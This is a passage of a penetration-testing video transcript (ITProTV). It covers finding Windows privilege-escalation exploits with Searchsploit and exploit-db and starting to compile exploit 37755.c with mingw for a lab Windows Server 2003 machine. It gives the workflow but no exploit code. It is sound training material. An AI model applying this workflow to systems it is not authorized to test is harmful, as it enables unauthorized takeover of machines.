00:30:44.580\n&gt;&gt; Windows doesn't with\nSubSeven pre-installed?\n\n603\n00:30:44.580 --> 00:30:45.450\nIt's weird.\n&gt;&gt; You know, like I said,\n\n604\n00:30:45.450 --> 00:30:48.450\nunless your victim happens\nto be running Kali Linux,\n\n605\n00:30:48.450 --> 00:30:50.540\nmost of those tools are probably\nnot gonna be there, so.\n\n606\n00:30:50.540 --> 00:30:51.180\n&gt;&gt; Yeah.\n\n607\n00:30:51.180 --> 00:30:53.370\n&gt;&gt; All right, Daniel, we appreciate that,\ngreat demonstrations.\n\n608\n00:30:53.370 --> 00:30:55.800\nWe hope everybody out there\nenjoyed watching this one.\n\n609\n00:30:55.800 --> 00:30:58.760\nSigning out for ITPRO.TV,\nI've been your host Mike Rodrick.\n\n610\n00:30:58.760 --> 00:30:59.590\n&gt;&gt; And I'm Daniel Lowrie.\n\n611\n00:30:59.590 --> 00:31:00.401\nAnd we'll see you next time.\n\n612\n00:31:00.401 --> 00:31:07.985\n[MUSIC]\n\n613\n00:31:07.985 --> 00:31:13.729\n&gt;&gt; Thank you for watching

Hello, welcome to another\nexciting episode here at ITProTV.\n\n4\n00:00:15.862 --> 00:00:19.406\nI'm your host Mike Rodrick, and\ntoday we're doing penetration testing.\n\n5\n00:00:19.406 --> 00:00:23.410\nAnd in this episode, we're gonna be\nlooking at escalating privileges.\n\n6\n00:00:23.410 --> 00:00:24.720\nAnd specifically in this one,\n\n7\n00:00:24.720 --> 00:00:27.450\nwe're gonna be looking at it\nfrom the Windows side of things.\n\n8\n00:00:27.450 --> 00:00:29.750\nWe'll do another one where\nwe take a look at Linux.\n\n9\n00:00:29.750 --> 00:00:33.600\nBut when we're talking about escalating\nprivileges, we might break into a box,\n\n10\n00:00:33.600 --> 00:00:36.270\nwe might be down here on\nthose privilege totem pole.\n\n11\n00:00:36.270 --> 00:00:39.580\nWe wanna get higher, or\nall the way to the top, maybe.\n\n12\n00:00:39.580 --> 00:00:41.600\nAnd who's gonna help us do that?\n\n13\n00:00:41.600 --> 00:00:43.800\nWell, Mr. Daniel Lowrie,\nwelcome back Daniel.\n\n14\n00:00:43.800 --> 00:00:45.290\n&gt;&gt; Mike, so glad to be back.\n\n15\n00:00:45.290 --> 00:00:48.620\nI'm glad to have the lovely\nviewers out there watching us.\n\n16\n00:00:48.620 --> 00:00:51.440\nHopefully you guys are like,\nyes, yes, finally.\n\n17\n00:00:51.440 --> 00:00:57.180\nCuz, yeah, I can gain some shell access,\nbut it's not administrative shell access.\n\n18\n00:00:57.180 --> 00:00:59.880\nIt's running as a service account or\nthings of that nature.\n\n19\n00:00:59.880 --> 00:01:03.870\nThese things that Mike was alluding\nto as he introduced the show.\n\n20\n00:01:03.870 --> 00:01:05.060\nCuz that's what happens a lot.\n\n21\n00:01:05.060 --> 00:01:10.150\nYou might have exploited something, but\nthe user account that you got the password\n\n22\n00:01:10.150 --> 00:01:15.050\nfor, or you ran a buffer overflow and\nyou exploited a mail\n\n23\n00:01:15.050 --> 00:01:19.130\nserver with a mail account, and you're\nrunning as mail account one or something.\n\n24\n00:01:19.130 --> 00:01:20.180\nIt's not administrative privileges.\n\n25\n00:01:20.180 --> 00:01:24.534\n&gt;&gt; Yeah, and you might get lucky and\nsome administrator gave domain\n\n26\n00:01:24.534 --> 00:01:28.190\nadmin rights to the service,\nor something like that.\n\n27\n00:01:28.190 --> 00:01:31.965\nBut odds are, they've done\na little bit of best practices.\n\n28\n00:01:31.965 --> 00:01:35.080\nThey've made an account, standard user,\nand that service runs into that.\n\n29\n00:01:35.080 --> 00:01:38.233\nAnd they'll give whatever permissions\nthey need to for that service to run.\n\n30\n00:01:38.233 --> 00:01:40.345\nThey're not thinking about you\nbreaking into the machine and\n\n31\n00:01:40.345 --> 00:01:41.609\nhow you're gonna need root access.\n\n32\n00:01:41.609 --> 00:01:44.290\nSo somehow we've gotta\nbump our privileges up.\n\n33\n00:01:44.290 --> 00:01:45.018\n&gt;&gt; That's exactly right.\n\n34\n00:01:45.018 --> 00:01:47.437\nAnd that's what we're\ngonna talk about today so\n\n35\n00:01:47.437 --> 00:01:51.040\nthat we can reach those upper echelons and\ntake control, full control.\n\n36\n00:01:51.040 --> 00:01:53.693\nCuz that's what it's all about,\nfull control of these systems.\n\n37\n00:01:53.693 --> 00:01:57.720\nSo, today is obviously all about\nWindows and how to do that there.\n\n38\n00:01:57.720 --> 00:02:00.590\nWe're gonna do a couple of different\nways in which we can do this.\n\n39\n00:02:00.590 --> 00:02:03.800\nThe first way in which we're gonna\nstart off with is actually finding\n\n40\n00:02:03.800 --> 00:02:08.510\na privilege escalation exploit\nout in the wild, using it so\n\n41\n00:02:08.510 --> 00:02:11.230\nthat we might escalate our privileges.\n\n42\n00:02:11.230 --> 00:02:12.200\nHey, how about that?\n\n43\n00:02:12.200 --> 00:02:14.420\n&gt;&gt; I like that.\nWe found an exploit to get into the box.\n\n44\n00:02:14.420 --> 00:02:17.354\nWe find another exploit to\nescalate our privileges.\n\n45\n00:02:17.354 --> 00:02:17.952\nWhat could be better?\n\n46\n00:02:17.952 --> 00:02:20.770\n&gt;&gt; Yeah,\nwe don't have to do all the heavy lifting.\n\n47\n00:02:20.770 --> 00:02:23.532\nBut, be warned,\nthere's going to be some heavy lifting.\n\n48\n00:02:23.532 --> 00:02:25.367\n&gt;&gt; [LAUGH]\n&gt;&gt; There's gonna be some very heavy\n\n49\n00:02:25.367 --> 00:02:26.512\nlifting, my goodness.\n\n50\n00:02:26.512 --> 00:02:28.815\n&gt;&gt; [LAUGH]\n&gt;&gt; Caveats for the day, remember,\n\n51\n00:02:28.815 --> 00:02:31.700\nwe always start of with our don't do\nthis for a nefarious things, right.\n\n52\n00:02:31.700 --> 00:02:35.501\nNot good, bad, bad, [SOUND] smack,\nsmack, smack, no, no no.\n\n53\n00:02:35.501 --> 00:02:38.403\nOnly if you have authorized\naccess to try these things or\n\n54\n00:02:38.403 --> 00:02:40.450\nif the machines are owned by yourself.\n\n55\n00:02:41.510 --> 00:02:44.460\nAnd make sure this is in\na sandboxed environment because,\n\n56\n00:02:44.460 --> 00:02:46.940\nwell, there's a vulnerability there\n\n57\n00:02:46.940 --> 00:02:49.770\nthat you don't want the hackers of\nthe world uniting against, right?\n\n58\n00:02:49.770 --> 00:02:51.590\nSo, make sure you do that.\n\n59\n00:02:51.590 --> 00:02:57.265\nAnd another caveat for this specific\nshow is that when you find exploit code,\n\n60\n00:02:57.265 --> 00:03:03.747\nokay, you gotta remember, these are called\nproof of concept codes typically, POCs.\n\n61\n00:03:03.747 --> 00:03:07.153\nWhen you find these out in the wild,\na, you need to verify,\n\n62\n00:03:07.153 --> 00:03:11.280\nby looking at that code,\nthat it's not something malicious, right?\n\n63\n00:03:11.280 --> 00:03:13.610\nBecause I can put a code out\nin an exploit database and\n\n64\n00:03:13.610 --> 00:03:18.615\nsay, hey this exploits Windows machines,\nyour Windows machine.\n\n65\n00:03:18.615 --> 00:03:22.610\n[LAUGH] So when the shell code fires up,\nyou're pumping a shell to me and\n\n66\n00:03:22.610 --> 00:03:24.570\nyou're like, hmm,\nI wonder why I'm not getting shell,\n\n67\n00:03:24.570 --> 00:03:27.040\nI guess I just don't understand\nthis exploit very well.\n\n68\n00:03:27.040 --> 00:03:30.100\nSo be very careful on your source,\nall right?\n\n69\n00:03:30.100 --> 00:03:31.840\nSo wherever you get these exploits from,\n\n70\n00:03:31.840 --> 00:03:34.510\njust don't willy nilly go out\nin the world and grab one.\n\n71\n00:03:34.510 --> 00:03:40.450\nOnly from trusted sources should you\ngrab pre-made exploits from, okay?\n\n72\n00:03:40.450 --> 00:03:44.583\nAnd also you were to get some of that\nstuff from, if you're running Kali Linux\n\n73\n00:03:44.583 --> 00:03:48.734\nit's easy, or if you access to the\nInternet, you can get it there, as well.\n\n74\n00:03:48.734 --> 00:03:51.229\nI'll show you a resource\nthat kinda ties into that.\n\n75\n00:03:52.730 --> 00:03:56.912\nAnd then, the problem comes in to, you\ngotta remember, when they compiled that\n\n76\n00:03:56.912 --> 00:04:00.847\ncode, when they ran it, when they wrote\nit, it was for a specific operating\n\n77\n00:04:00.847 --> 00:04:05.680\nsystem, and off a specific architecture,\nwhich may be different than yours.\n\n78\n00:04:05.680 --> 00:04:09.180\nSo, you might get some compilation errors,\nyou might have to go in and\n\n79\n00:04:09.180 --> 00:04:12.290\nchange things,\nput in different shell code.\n\n80\n00:04:12.290 --> 00:04:14.400\nGood thing is, we know how to\ncreate our own shell code, right?\n\n81\n00:04:14.400 --> 00:04:15.765\nSo that shouldn't be too difficult.\n\n82\n00:04:15.765 --> 00:04:17.194\nYou're gonna have to go in and\nchange the IP addresses.\n\n83\n00:04:17.194 --> 00:04:20.110\nYou're gonna have to do some finagling,\nusually.\n\n84\n00:04:20.110 --> 00:04:21.081\nMe and Mike were talking about this.\n\n85\n00:04:21.081 --> 00:04:23.682\n&gt;&gt; [LAUGH]\n&gt;&gt; We've only ever found one piece of\n\n86\n00:04:23.682 --> 00:04:27.350\nexploit code where,\nout of the box, it ran and worked.\n\n87\n00:04:27.350 --> 00:04:29.940\n&gt;&gt; We debated,\nI think they do it on purpose sometimes.\n\n88\n00:04:29.940 --> 00:04:30.455\n&gt;&gt; [LAUGH] Yeah.\n\n89\n00:04:30.455 --> 00:04:33.700\n&gt;&gt; Maybe to keep script kiddies and things\nlike that from finding the exploits and\n\n90\n00:04:33.700 --> 00:04:36.070\njust being able to use\nthem out of the box.\n\n91\n00:04:36.070 --> 00:04:38.540\nCuz I'm like,\nthe guy that wrote this was brilliant.\n\n92\n00:04:38.540 --> 00:04:39.770\nThere is no way,\n&gt;&gt; [LAUGH]\n\n93\n00:04:39.770 --> 00:04:41.630\n&gt;&gt; He used the wrong keyword here\n\n94\n00:04:41.630 --> 00:04:43.640\nthat's preventing this\nthing from compiling.\n\n95\n00:04:43.640 --> 00:04:47.170\nSo sometimes I think either the author,\nor the site that's hosting them,\n\n96\n00:04:47.170 --> 00:04:48.870\nand this is just theory, just me guessing,\n\n97\n00:04:48.870 --> 00:04:51.750\nbut sometimes I think they\ntweak them a little bit.\n\n98\n00:04:51.750 --> 00:04:53.400\nSo you have to know what\nyou're doing to use them.\n\n99\n00:04:53.400 --> 00:04:57.140\n&gt;&gt; Yeah, just enough to where if you're\nnot a bit of a programmer, at least in\n\n100\n00:04:57.140 --> 00:05:00.670\nsome way, you don't have some programming\nknowledge, it's not gonna work.\n\n101\n00:05:00.670 --> 00:05:02.073\nAnd I can attest to this fact.\n\n102\n00:05:02.073 --> 00:05:02.688\n&gt;&gt; [LAUGH]\n&gt;&gt; Because I\n\n103\n00:05:02.688 --> 00:05:07.080\nactually had to get Justin Dennison,\nour of our development gurus here.\n\n104\n00:05:08.210 --> 00:05:12.220\nHe did our Python show,\nhe's working on JavaScripting right now.\n\n105\n00:05:12.220 --> 00:05:18.280\nSuper smart guy, and he was sitting there,\nhmm, what's going on?\n\n106\n00:05:18.280 --> 00:05:21.590\nAnd he had to look at it, and\nI'm like, okay, so I'm not crazy here.\n\n107\n00:05:21.590 --> 00:05:23.910\nI'm not the only one that's having\na difficult time figuring it out.\n\n108\n00:05:23.910 --> 00:05:26.160\nSo it can be very frustrating.\n\n109\n00:05:26.160 --> 00:05:28.490\nStick with it, use Google,\nit's your friend.\n\n110\n00:05:28.490 --> 00:05:30.966\nAnd as Adam says,\nit's the Oracle of the internet, and\n\n111\n00:05:30.966 --> 00:05:32.840\nhopefully that won't let you down.\n\n112\n00:05:32.840 --> 00:05:35.580\nIf you have resources,\nyou know a developer, call them in,\n\n113\n00:05:35.580 --> 00:05:37.804\nhey I need your help with this,\nI'm not seeing.\n\n114\n00:05:37.804 --> 00:05:40.010\nSo, it can be very frustrating.\n\n115\n00:05:40.010 --> 00:05:41.400\nBut, the code does exist.\n\n116\n00:05:41.400 --> 00:05:44.420\nAll you have to do is know how to modify\nit correctly if it doesn't compile\n\n117\n00:05:44.420 --> 00:05:48.300\ncorrectly right out of the gate,\nchange the parameters that are necessary.\n\n118\n00:05:48.300 --> 00:05:50.480\nAnd then you should be off and running.\n\n119\n00:05:50.480 --> 00:05:51.790\nHopefully, fingers crossed, right?\n\n120\n00:05:51.790 --> 00:05:53.460\nThat's always the case.\n\n121\n00:05:53.460 --> 00:05:55.600\n&gt;&gt; All right Daniel, so show us where\nwe can get some of these exploits.\n\n122\n00:05:55.600 --> 00:05:56.700\n&gt;&gt; All right, let's do that.\n\n123\n00:05:56.700 --> 00:05:57.859\nLet's jump to my machine.\n\n124\n00:05:57.859 --> 00:05:59.520\nThere's a couple ways you can do this.\n\n125\n00:05:59.520 --> 00:06:04.630\nOne of them is using,\nKali Linux is basically developed by\n\n126\n00:06:04.630 --> 00:06:09.510\na entity called Offensive Security,\nthey developed Kali Linux.\n\n127\n00:06:09.510 --> 00:06:13.580\nI love Offensive Security, they have\ngreat certifications for this very thing.\n\n128\n00:06:13.580 --> 00:06:15.850\nThey have great information\non their website.\n\n129\n00:06:15.850 --> 00:06:17.390\nIt's a wonderful, wonderful place.\n\n130\n00:06:17.390 --> 00:06:18.320\nThat's where we get Kali Linux.\n\n131\n00:06:18.320 --> 00:06:23.610\nAnd because they do that, they put their\ndatabase of exploits in the machine.\n\n132\n00:06:23.610 --> 00:06:27.183\nSo all you have to do is run this cool\nlittle program called Searchsploit.\n\n133\n00:06:29.229 --> 00:06:32.250\nLike that, and\nthen give it something to look for.\n\n134\n00:06:32.250 --> 00:06:36.609\nSo if I wanted to say, Windows,\n\n135\n00:06:36.609 --> 00:06:41.136\nwe'll say 2003.priv esc.\n\n136\n00:06:41.136 --> 00:06:45.300\nThere you go, I'm seeing some privilege\nescalation exploits right there.\n\n137\n00:06:45.300 --> 00:06:47.600\nCuz that's what I looked for,\nprivilege and escalation.\n\n138\n00:06:47.600 --> 00:06:52.475\nAnd over here is the different codes,\nand they give them a numbering system.\n\n139\n00:06:52.475 --> 00:06:54.659\nFor whatever reason,\nthat's what they went with.\n\n140\n00:06:54.659 --> 00:06:58.550\nAs you can see some of them are .c,\nsome of them are .py for python.\n\n141\n00:06:58.550 --> 00:07:01.130\nSo a lot of c code and a lot of python,\nsome of them are text bases.\n\n142\n00:07:01.130 --> 00:07:04.960\nMaybe you have to save it as a c file or\nsomething like that.\n\n143\n00:07:04.960 --> 00:07:07.170\nYou have to look at them\nto know what they are.\n\n144\n00:07:07.170 --> 00:07:12.750\nAnd you can see the path, right here, it's\nsaved in user/share/ exploitdb/platforms.\n\n145\n00:07:12.750 --> 00:07:16.150\nThis is under Windows, denial of service,\nthat's a denial of service attack,\n\n146\n00:07:16.150 --> 00:07:18.160\nI don't really care for that.\n\n147\n00:07:18.160 --> 00:07:22.765\nBut this is a local, which means that you\nhave to run it on the machine itself.\n\n148\n00:07:22.765 --> 00:07:25.140\nWe'd have to use our FTPing abilities,\nmaybe,\n\n149\n00:07:25.140 --> 00:07:30.670\nto upload that to our vulnerable server so\nthat we can escalate our privileges.\n\n150\n00:07:30.670 --> 00:07:34.340\nAnd of course, that's after\nwe've compiled it and it's run.\n\n151\n00:07:34.340 --> 00:07:36.230\nAll right, so\nthat's one place to get them.\n\n152\n00:07:36.230 --> 00:07:37.879\nThis is a very nice thing.\n\n153\n00:07:37.879 --> 00:07:39.880\nYou'll probably use both\nof these resources.\n\n154\n00:07:39.880 --> 00:07:44.603\nThe other place is actually from\nOffensive Security, from exploit-db.\n\n155\n00:07:44.603 --> 00:07:49.416\nSo let's, let me open up a browser here,\nit's my 2003 server running,\n\n156\n00:07:49.416 --> 00:07:51.797\nbut I just need Firefox or something.\n\n157\n00:07:51.797 --> 00:07:57.262\nAnd just go to www.exploit-db.com.\n\n158\n00:07:57.262 --> 00:07:59.594\nAnd there you go,\nthere's is a database archive right there,\n\n159\n00:07:59.594 --> 00:08:00.835\nstaring at you right in the face.\n\n160\n00:08:00.835 --> 00:08:03.275\nFree for all to use.\n\n161\n00:08:03.275 --> 00:08:06.884\nThey do recommend that you go download\nKali Linux and run that cuz it's\n\n162\n00:08:06.884 --> 00:08:11.042\na lot easier than using their side because\nI wanna make sure that you are not a bot,\n\n163\n00:08:11.042 --> 00:08:14.280\nsome sort of automated program search for\nexploits.\n\n164\n00:08:14.280 --> 00:08:17.421\nThere's some of the remote\nexploits category,\n\n165\n00:08:17.421 --> 00:08:22.566\nincludes exploits from web services,\nweb applications, they break it down.\n\n166\n00:08:22.566 --> 00:08:28.026\nI can come over here and hit Search,\ngo to the Search screen,\n\n167\n00:08:28.026 --> 00:08:31.363\nhit Windows, 2003, priv esc.\n\n168\n00:08:31.363 --> 00:08:33.150\nSay I am not a robot.\n\n169\n00:08:34.590 --> 00:08:35.487\nAnd search.\n\n170\n00:08:35.487 --> 00:08:39.345\nAnd that can get extremely annoying,\nbut they do it for good purposes.\n\n171\n00:08:39.345 --> 00:08:40.172\n&gt;&gt; Yes.\n\n172\n00:08:40.172 --> 00:08:42.610\nAnd there you go, there's the exploits.\n\n173\n00:08:42.610 --> 00:08:45.805\nI do kind of like to do side\nby side with Searchsploit,\n\n174\n00:08:45.805 --> 00:08:49.071\nfind the ones I'm looking for\nand then jump on the DB and\n\n175\n00:08:49.071 --> 00:08:50.780\njust put the URL in-\n&gt;&gt; Mm-hm.\n\n176\n00:08:50.780 --> 00:08:53.540\n&gt;&gt; So I can see it and\nit's a nicer format in the web.\n\n177\n00:08:53.540 --> 00:08:54.278\nIt is for me.\n\n178\n00:08:54.278 --> 00:08:54.800\n&gt;&gt; Yup.\n\n179\n00:08:54.800 --> 00:08:56.074\n&gt;&gt; So there you go.\n\n180\n00:08:56.074 --> 00:08:58.862\nThere are some places you can\nget exploit code from, and\n\n181\n00:08:58.862 --> 00:09:02.600\nthey're should be relatively safe,\nstill check them.\n\n182\n00:09:02.600 --> 00:09:04.567\nAlways change out your shell code,\nthings of that.\n\n183\n00:09:04.567 --> 00:09:06.908\nSo that it's,\nI mean that's just a simple thing to do.\n\n184\n00:09:06.908 --> 00:09:11.097\nIf there's shell code in there, generate\nyour own shell code using an SFM and\n\n185\n00:09:11.097 --> 00:09:13.810\npop it into your script, okay?\n\n186\n00:09:13.810 --> 00:09:16.600\nSo now that we know where to get them,\n\n187\n00:09:16.600 --> 00:09:20.294\nlet's take a look at some\nof them that came back.\n\n188\n00:09:20.294 --> 00:09:25.156\nAnd I will tell you, I went through\njust about, I think every single one\n\n189\n00:09:25.156 --> 00:09:29.776\nof these exploits and worked with them,\ntrying to get them to run for\n\n190\n00:09:29.776 --> 00:09:34.583\nour purposes before, obviously today,\nthe show is being recorded.\n\n191\n00:09:34.583 --> 00:09:37.090\n&gt;&gt; Let me guess,\nit was the last one you tried.\n\n192\n00:09:37.090 --> 00:09:38.883\n&gt;&gt; It was the very last one I tried,\nright?\n\n193\n00:09:38.883 --> 00:09:40.053\n&gt;&gt; [LAUGH]\n&gt;&gt; It's always-\n\n194\n00:09:40.053 --> 00:09:40.953\n&gt;&gt; And it's always.\n\n195\n00:09:40.953 --> 00:09:43.698\n&gt;&gt; And of course it's the last one you\ntry because you stop after you find one\n\n196\n00:09:43.698 --> 00:09:44.206\nthat works.\n\n197\n00:09:44.206 --> 00:09:45.015\n&gt;&gt; [LAUGH]\n&gt;&gt; So,\n\n198\n00:09:45.015 --> 00:09:48.450\nright there's is a funny little\nnugget of wisdom for you.\n\n199\n00:09:48.450 --> 00:09:51.552\nBut not only was it the last one I tried,\nbut it was the last one on the list.\n\n200\n00:09:51.552 --> 00:09:52.193\n&gt;&gt; Yes, there you go.\n&gt;&gt; That's which\n\n201\n00:09:52.193 --> 00:09:52.734\nwas what Mike was meaning, right?\n\n202\n00:09:52.734 --> 00:09:53.784\n&gt;&gt; That was what I was trying to say.\n\n203\n00:09:53.784 --> 00:09:55.665\nIt was the last one on the list.\n\n204\n00:09:55.665 --> 00:09:57.552\nCuz I start at the bottom\nof every list I look at.\n\n205\n00:09:57.552 --> 00:09:59.010\n&gt;&gt; [LAUGH]\n&gt;&gt; I don't know about you, right?\n\n206\n00:09:59.010 --> 00:10:03.397\nBut, well it was a lot of pain and\nsuffering, but I do it for you, right?\n\n207\n00:10:03.397 --> 00:10:05.390\nI do it for you so\nyou could see cool stuff.\n\n208\n00:10:05.390 --> 00:10:07.040\n&gt;&gt; And that's what you have to go through-\n&gt;&gt; Yeah.\n\n209\n00:10:07.040 --> 00:10:08.668\n&gt;&gt; As a penetration tester,\n\n210\n00:10:08.668 --> 00:10:12.200\nyou have to try them all until\nyou find one that works.\n\n211\n00:10:12.200 --> 00:10:17.514\n&gt;&gt; That's exactly right, it's just part\nof the job, it's gonna be frustrating.\n\n212\n00:10:17.514 --> 00:10:21.950\nI don't want you to think Daniel just\ntypes the stuff and it goes easy.\n\n213\n00:10:21.950 --> 00:10:24.546\nIt doesn't.\nIt does on the show because otherwise\n\n214\n00:10:24.546 --> 00:10:27.724\nthe time constraints would\nkeep us from showing you.\n\n215\n00:10:27.724 --> 00:10:29.010\nThis takes me hours, right?\n\n216\n00:10:29.010 --> 00:10:31.793\nI have to go through\nthe same pains that you do.\n\n217\n00:10:31.793 --> 00:10:33.201\nThis isn't compiling, why?\n\n218\n00:10:33.201 --> 00:10:34.150\nGoogle search the air.\n\n219\n00:10:34.150 --> 00:10:38.761\nOkay, this guy says this, this guy says\nthat, this girl says such and such.\n\n220\n00:10:38.761 --> 00:10:39.520\nLet me try that.\n\n221\n00:10:39.520 --> 00:10:42.649\nOkay I got rid of some compilation\nerrors but I'm still getting this one,\n\n222\n00:10:42.649 --> 00:10:43.668\nwhy is that happening?\n\n223\n00:10:43.668 --> 00:10:45.060\nAnd it's just not working.\n\n224\n00:10:45.060 --> 00:10:46.877\nNo completion errors and\nit still didn't work.\n\n225\n00:10:46.877 --> 00:10:50.110\nFrustration, frustration, continue to try.\n\n226\n00:10:50.110 --> 00:10:53.877\nThat's what all this about, you're just\ngonna keep trying things over and over and\n\n227\n00:10:53.877 --> 00:10:54.470\nover again.\n\n228\n00:10:54.470 --> 00:10:56.386\nYou just have to stick with it,\n\n229\n00:10:56.386 --> 00:10:58.489\nyou just have to not give up-\n&gt;&gt; Mm-hm.\n\n230\n00:10:58.489 --> 00:11:00.568\n&gt;&gt; And eventually, and man when it does,\n\n231\n00:11:00.568 --> 00:11:04.033\nwhen you bust to that door with\nthat thing that you didn't think,\n\n232\n00:11:04.033 --> 00:11:07.750\nthis is gonna work, I will just try but\nwhat the heck, and it happens?\n\n233\n00:11:07.750 --> 00:11:09.631\nElation.\n\n234\n00:11:09.631 --> 00:11:11.887\nIt's addictive,\nI'll be honest with you, it's very fun.\n\n235\n00:11:11.887 --> 00:11:13.388\n&gt;&gt; [LAUGH]\n&gt;&gt; Okay, so\n\n236\n00:11:13.388 --> 00:11:15.737\nwhich one was it that helped me out?\n\n237\n00:11:15.737 --> 00:11:19.235\nThere's a lot of good one, I actually did\nfind one that did deny our service server.\n\n238\n00:11:19.235 --> 00:11:19.860\n&gt;&gt; Hmm.\n\n239\n00:11:19.860 --> 00:11:23.424\n&gt;&gt; So if I wanted to do that instead it\nwas a privilege escalation attack, but\n\n240\n00:11:23.424 --> 00:11:26.138\nall it did for me was DOS the server,\nI mean blue screen.\n\n241\n00:11:26.138 --> 00:11:26.864\nIt was done and it rebooted.\n\n242\n00:11:26.864 --> 00:11:28.200\n&gt;&gt; Wow.\n&gt;&gt; Yeah.\n\n243\n00:11:28.200 --> 00:11:33.040\nThat was this one I think,\ndouble free memory right there.\n\n244\n00:11:33.040 --> 00:11:37.256\nSo I compiled it, got it to work and\ndownloaded it to the server,\n\n245\n00:11:37.256 --> 00:11:41.174\nfired it off and\nall of a sudden it was like, hello, hello.\n\n246\n00:11:41.174 --> 00:11:43.466\nI look and run the server,\njust blue screen sitting there.\n\n247\n00:11:43.466 --> 00:11:45.480\n&gt;&gt; [LAUGH]\n&gt;&gt; Then it rebooted.\n\n248\n00:11:45.480 --> 00:11:47.248\nBut this one was the one that worked for\nme.\n\n249\n00:11:47.248 --> 00:11:51.058\nThis guy 37755.C.\n\n250\n00:11:51.058 --> 00:11:58.175\nThis is Windows Server 2003\nSP2 TCPIPIOCTL privilege escalation.\n\n251\n00:11:58.175 --> 00:12:00.521\nLike I said I went through them all.\n\n252\n00:12:00.521 --> 00:12:05.040\nAs you saw before my 2003\nserver is over here running.\n\n253\n00:12:05.040 --> 00:12:10.338\nAnd let's set the stage for you,\nI have scanned it, I've enumerated it,\n\n254\n00:12:10.338 --> 00:12:15.065\nI have gained a user account and\npassword through whatever means.\n\n255\n00:12:15.065 --> 00:12:18.009\nWe're kinda fast forwarding through\nthat cuz we want to get to privilege\n\n256\n00:12:18.009 --> 00:12:21.483\nescalation, so we're assuming that I've\nalready gone through a lot of the headache\n\n257\n00:12:21.483 --> 00:12:22.990\nof getting into the box.\n\n258\n00:12:22.990 --> 00:12:25.500\nNow I need to escalate\nthe privileges that I have had,\n\n259\n00:12:25.500 --> 00:12:27.010\nbecause they're not administrative.\n\n260\n00:12:27.010 --> 00:12:32.321\nSo that's the stage we set,\nthere's our 2003 Server running.\n\n261\n00:12:32.321 --> 00:12:35.233\nAnd now, we're going to,\nI've RDPed into it.\n\n262\n00:12:35.233 --> 00:12:36.472\nHere's my RDP session.\n\n263\n00:12:36.472 --> 00:12:40.469\nRight here, hopefully that is,\nthat looks pretty good on the screen.\n\n264\n00:12:40.469 --> 00:12:42.473\nHopefully that's nice and big.\n\n265\n00:12:42.473 --> 00:12:44.290\nMike, you'll let me know if\nit's too small or anything?\n\n266\n00:12:44.290 --> 00:12:44.890\n&gt;&gt; I will.\n&gt;&gt; All right.\n\n267\n00:12:44.890 --> 00:12:49.359\nSo I'm just gonna log in,\nI'm a normal user, right?\n\n268\n00:12:49.359 --> 00:12:52.316\nJust any old person, I logged in.\n\n269\n00:12:52.316 --> 00:12:56.100\nMaybe this is, I don't know,\nterminal server or something like that.\n\n270\n00:12:56.100 --> 00:12:57.481\nWho knows?\n\n271\n00:12:57.481 --> 00:13:02.030\nBut I've got an RDP session, it allowed\nme to do that with an underling user.\n\n272\n00:13:02.030 --> 00:13:04.682\nSo now what I gotta do is\nI'm gonna jump over here.\n\n273\n00:13:04.682 --> 00:13:06.349\nNow that you've seen the stage, it's set.\n\n274\n00:13:06.349 --> 00:13:11.340\nI'm just gonna shrink that back down,\ncuz it's just kind of distracting.\n\n275\n00:13:11.340 --> 00:13:14.020\nI'll shrink this too.\n\n276\n00:13:14.020 --> 00:13:15.776\nWe need to compile that code.\n\n277\n00:13:15.776 --> 00:13:18.345\nOne way that you do it is just copy,\nmake a directory.\n\n278\n00:13:18.345 --> 00:13:23.088\nNotice I've created this directory\nPerlDesk, just copy that over to,\n\n279\n00:13:23.088 --> 00:13:26.520\nor create a directory, and\ncopy that exploit code.\n\n280\n00:13:26.520 --> 00:13:31.398\nSo just do a CP User Share Exploit, blah\nblah blah, all the way down to 37755c,\n\n281\n00:13:31.398 --> 00:13:34.857\nand if you do an LS here you'll\nnotice that I have done that.\n\n282\n00:13:34.857 --> 00:13:37.900\nThere it is.\nAnd now we gotta compile it.\n\n283\n00:13:37.900 --> 00:13:41.226\nNow this is a Windows-based exploit,\nnot Linux.\n\n284\n00:13:41.226 --> 00:13:43.682\nSo we need to use a Windows compiler.\n\n285\n00:13:43.682 --> 00:13:47.564\nA little guy called Ming, Ming W32.\n\n286\n00:13:47.564 --> 00:13:50.150\nIt's a very nice compiler,\nit's part of GC.\n\n287\n00:13:50.150 --> 00:13:52.640\nI don't know if it's GCC if they make it,\nbut\n\n288\n00:13:52.640 --> 00:13:57.450\nit works like GCC just for\nWindows-based executables.\n\n289\n00:13:57.450 --> 00:14:00.040\nSo what you gotta do is, if you say i686,\n\n290\n00:14:00.040 --> 00:14:04.660\ncuz that's the architecture running under,\nthere's a lot of different Ming\n\n291\n00:14:04.660 --> 00:14:08.378\ncommands depending on the architecture\nyou are working with.\n\n292\n00:14:08.378 --> 00:14:10.513\nSo you gotta play around with Ming.\n\n293\n00:14:12.064 --> 00:14:18.850\nAnd then _, it is mingw32, like so.\n\n294\n00:14:18.850 --> 00:14:25.308\nAnd then we do -gcc, cuz that's\nour c compiler, it's the C code.\n\n295\n00:14:25.308 --> 00:14:29.817\nThen we're going to give it\nthe file name which is 37755.c and\n\n296\n00:14:29.817 --> 00:14:32.880\nthen dash O for what we want to output.\n\n297\n00:14:32.880 --> 00:14:38.524\nNow I've already created this Net.exe,\nthat's what I named it,\n\n298\n00:14:38.524 --> 00:14:45.669\nbut I'll show you what it looks like when\nI do this, so I'll just call it Net2.exe.\n\n299\n00:14:45.669 --> 00:14:47.108\nAnd there you go.\n\n300\n00:14:47.108 --> 00:14:49.630\nAnd of course I get this whole\nlovely command not found.\n\n301\n00:14:49.630 --> 00:14:52.020\nWhat did I type incorrectly?\n\n302\n00:14:52.020 --> 00:14:53.350\nYeah.\n\n303\n00:14:53.350 --> 00:14:56.445\nI did type it incorrectly,\nI forgot one little,\n\n304\n00:14:56.445 --> 00:15:00.386\nmeaningful piece of information here,\nwhich is this w64.\n\n305\n00:15:00.386 --> 00:15:05.090\nSo it's basically like 32 and 64 bit\narchitecture command that I'm using.\n\n306\n00:15:05.090 --> 00:15:08.595\nSo if it's a 32 bit program,\nit'll compile.\n\n307\n00:15:08.595 --> 00:15:10.130\nIt's a 64-bit program, it'll compile.\n\n308\n00:15:10.130 --> 00:15:11.106\nAnd we like that.\n\n309\n00:15:11.106 --> 00:15:12.020\nSo dash, there we go.\n\n310\n00:15:12.020 --> 00:15:12.849\nThat's what the command should like that.\n\n311\n00:15:12.849 --> 00:15:14.259\n&gt;&gt; Wait,\nI think you gotta underscore there.\n\n312\n00:15:14.259 --> 